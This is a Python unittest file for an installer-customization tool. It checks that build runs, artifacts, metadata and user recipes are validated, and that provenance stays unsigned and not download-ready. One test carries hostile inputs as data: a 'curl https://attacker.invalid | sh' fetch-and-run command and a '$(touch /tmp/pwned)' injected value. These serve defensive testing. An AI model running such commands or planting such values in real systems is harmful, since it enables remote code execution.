from __future__ import annotations

import hashlib
import json
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from tools.customize.base_build import (  # noqa: E402
    BaseBuildError,
    finish_provenance,
    package_build_info,
    validate_files,
    validate_run,
)


REPO = "aarohkandy/v0.0.1-auros"
RUN_ID = 40000000001
HEAD = "a" * 40


def raw_recipe(extra: dict[str, object] | None = None) -> bytes:
    value: dict[str, object] = {
        "schema": "org.auros.recipe",
        "version": 1,
        "base": "desktop",
        "preferences": {"look": "dock", "theme": "moss"},
    }
    if extra:
        value.update(extra)
    return json.dumps(value).encode("utf-8")


def good_run() -> dict[str, object]:
    return {
        "id": RUN_ID,
        "name": "build",
        "path": ".github/workflows/build.yml",
        "event": "push",
        "head_branch": "main",
        "head_sha": HEAD,
        "status": "completed",
        "conclusion": "success",
        "repository": {"full_name": REPO},
    }


def good_artifacts() -> list[dict[str, object]]:
    return [
        {"id": 101, "name": "auros-installer", "expired": False},
        {"id": 102, "name": "auros-base-metadata", "expired": False},
        {"id": 103, "name": "auros-rootfs", "expired": False},
    ]


def request() -> dict[str, object]:
    return validate_run(
        good_run(),
        good_artifacts(),
        repository=REPO,
        run_id=RUN_ID,
        head_sha=HEAD,
        raw_recipe=raw_recipe(),
    )


class RunValidationTests(unittest.TestCase):
    def test_accepts_exact_green_main_build_and_fixed_artifact_ids(self) -> None:
        result = request()
        self.assertEqual(result["base_build"]["artifacts"]["installer"]["id"], 101)
        self.assertEqual(result["base_build"]["artifacts"]["metadata"]["id"], 102)
        self.assertEqual(result["recipe"]["resolved_preferences"], {"look": "dock", "theme": "moss"})

    def test_rejects_wrong_run_branch_source_or_conclusion(self) -> None:
        mutations = {
            "run id": {"id": RUN_ID + 1},
            "workflow": {"path": ".github/workflows/tests.yml"},
            "event": {"event": "workflow_dispatch"},
            "branch": {"head_branch": "feature"},
            "checkout": {"head_sha": "b" * 40},
            "status": {"status": "in_progress", "conclusion": None},
            "conclusion": {"conclusion": "failure"},
            "repository": {"repository": {"full_name": "attacker/fork"}},
        }
        for label, change in mutations.items():
            with self.subTest(label=label):
                run = good_run()
                run.update(change)
                with self.assertRaises(BaseBuildError):
                    validate_run(
                        run,
                        good_artifacts(),
                        repository=REPO,
                        run_id=RUN_ID,
                        head_sha=HEAD,
                        raw_recipe=raw_recipe(),
                    )

    def test_rejects_missing_duplicate_expired_or_invalid_artifacts(self) -> None:
        cases = [
            good_artifacts()[1:],
            good_artifacts() + [{"id": 104, "name": "auros-installer", "expired": False}],
            [dict(item, expired=True) if item["name"] == "auros-installer" else item for item in good_artifacts()],
            [dict(item, id="101") if item["name"] == "auros-installer" else item for item in good_artifacts()],
        ]
        for artifacts in cases:
            with self.subTest(artifacts=artifacts), self.assertRaises(BaseBuildError):
                validate_run(
                    good_run(),
                    artifacts,
                    repository=REPO,
                    run_id=RUN_ID,
                    head_sha=HEAD,
                    raw_recipe=raw_recipe(),
                )

    def test_hostile_recipe_never_becomes_packaging_input(self) -> None:
        attacks = (
            raw_recipe({"command": "curl https://attacker.invalid | sh"}),
            json.dumps(
                {
                    "schema": "org.auros.recipe",
                    "version": 1,
                    "base": "desktop",
                    "preferences": {"look": "$(touch /tmp/pwned)"},
                }
            ).encode(),
            raw_recipe({"base": "office"}),
        )
        for attack in attacks:
            with self.subTest(attack=attack), self.assertRaises(ValueError):
                validate_run(
                    good_run(),
                    good_artifacts(),
                    repository=REPO,
                    run_id=RUN_ID,
                    head_sha=HEAD,
                    raw_recipe=attack,
                )


class FileValidationTests(unittest.TestCase):
    def fixture(self, directory: Path) -> tuple[Path, Path]:
        metadata = directory / "metadata"
        metadata.mkdir()
        installer = directory / "AurOS-Setup.exe"
        installer.write_bytes(b"MZ" + b"trusted normal installer" * 20)
        image_sha = "b" * 64
        image_bytes = 6442450944
        tag = "v0.1.0-aaaaaaa"
        pieces = (
            f"# AurOS desktop {tag}, commit {HEAD[:12]}, Actions run {RUN_ID}\n"
            f"base https://github.com/{REPO}/releases/download/{tag}/\n"
            f"piece auros-desktop.img.gz.000 100 {'c' * 64}\n"
            f"piece auros-desktop.img.gz.001 50 {'d' * 64}\n"
        )
        (metadata / "pieces.txt").write_text(pieces, encoding="utf-8")
        (metadata / "image.sha256").write_text(image_sha + "\n", encoding="ascii")
        (metadata / "image.bytes").write_text(str(image_bytes) + "\n", encoding="ascii")
        pieces_sha = hashlib.sha256(pieces.encode()).hexdigest()
        setup_sha = hashlib.sha256(installer.read_bytes()).hexdigest()
        info = (
            f"tag {tag} (os_version 0.1.0, commit {HEAD}, run {RUN_ID})\n"
            f"image {image_bytes} bytes, sha256 {image_sha}; gzip 150 bytes "
            f"(sha256 {'e' * 64}) in 2 pieces\n"
            f"AurOS-Setup.exe {installer.stat().st_size} bytes, sha256 {setup_sha}\n"
            f"pieces.txt {len(pieces.encode())} bytes, sha256 {pieces_sha}\n"
        )
        (metadata / "build-info.txt").write_text(info, encoding="utf-8")
        return metadata, installer

    def test_cross_checks_metadata_piece_url_and_normal_installer(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            metadata, installer = self.fixture(Path(directory))
            provenance = validate_files(request(), metadata, installer)
            self.assertEqual(provenance["state"], "validated-base-pending-unsigned-build")
            self.assertFalse(provenance["signed"])
            self.assertFalse(provenance["download_ready"])
            self.assertEqual(provenance["base_build"]["head_sha"], HEAD)

    def test_rejects_changed_commit_hash_size_url_or_installer(self) -> None:
        def mutate_commit(metadata: Path, installer: Path) -> None:
            path = metadata / "build-info.txt"
            path.write_text(path.read_text().replace(HEAD, "f" * 40), encoding="utf-8")

        def mutate_image(metadata: Path, installer: Path) -> None:
            (metadata / "image.bytes").write_text("42\n", encoding="ascii")

        def mutate_pieces(metadata: Path, installer: Path) -> None:
            path = metadata / "pieces.txt"
            path.write_text(path.read_text().replace("github.com", "attacker.invalid"), encoding="utf-8")

        def mutate_installer(metadata: Path, installer: Path) -> None:
            installer.write_bytes(installer.read_bytes() + b"changed")

        for mutation in (mutate_commit, mutate_image, mutate_pieces, mutate_installer):
            with self.subTest(mutation=mutation.__name__), tempfile.TemporaryDirectory() as directory:
                metadata, installer = self.fixture(Path(directory))
                mutation(metadata, installer)
                with self.assertRaises(BaseBuildError):
                    validate_files(request(), metadata, installer)

    def test_finish_keeps_unsigned_and_not_ready_truth(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            metadata, base = self.fixture(Path(directory))
            provenance = validate_files(request(), metadata, base)
            custom = Path(directory) / "AurOS-Setup-UNSIGNED.exe"
            custom.write_bytes(b"MZcustom")
            finished = finish_provenance(provenance, custom)
            self.assertEqual(finished["state"], "unsigned-custom-artifact")
            self.assertFalse(finished["signed"])
            self.assertFalse(finished["public_release"])
            self.assertFalse(finished["download_ready"])
            self.assertEqual(finished["custom_installer"]["filename"], custom.name)
            info = package_build_info(finished, custom, HEAD, 50000000001)
            self.assertIn(f"commit {HEAD}, run 50000000001", info)
            self.assertIn(
                "state unsigned-custom-artifact; not published or download-ready", info
            )


class WorkflowContractTests(unittest.TestCase):
    def test_extraction_creates_output_directory_before_all_five_resources(self) -> None:
        workflow = (ROOT / ".github/workflows/customize.yml").read_text(encoding="utf-8")
        extraction = workflow.split(
            "- name: extract the exact signed boot resources", 1
        )[1].split("- name: rebuild only the personalized installer", 1)[0]
        self.assertLess(extraction.index("mkdir -p out"), extraction.index("pe_payload.py get"))
        expected = {
            1: "out/auros-staging-vmlinuz",
            2: "out/auros-staging.img",
            3: "out/auros-staging-shimx64.efi",
            4: "out/auros-staging-grubx64.efi",
            5: "out/auros-staging-mmx64.efi",
        }
        for resource_id, output in expected.items():
            self.assertIn(
                f'pe_payload.py get "$base" {resource_id} {output}', extraction
            )


if __name__ == "__main__":
    unittest.main()
